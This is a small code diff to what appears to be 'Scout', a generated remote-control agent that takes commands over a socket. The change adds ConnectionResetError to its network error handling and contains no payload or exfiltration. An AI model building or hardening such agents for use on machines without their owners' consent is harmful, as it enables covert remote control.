@@ -96,9 +96,9 @@ while True:
                 break#Statements#
             else:
                 send_all(s,'[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
-        except (socket.error,socket.timeout):
+        except (socket.error,socket.timeout,ConnectionResetError):
             try:
-                if type(e) not in (socket.error,socket.timeout):
+                if type(e) not in (socket.error,socket.timeout,ConnectionResetError):
                     raise e
                 s.close()
                 break
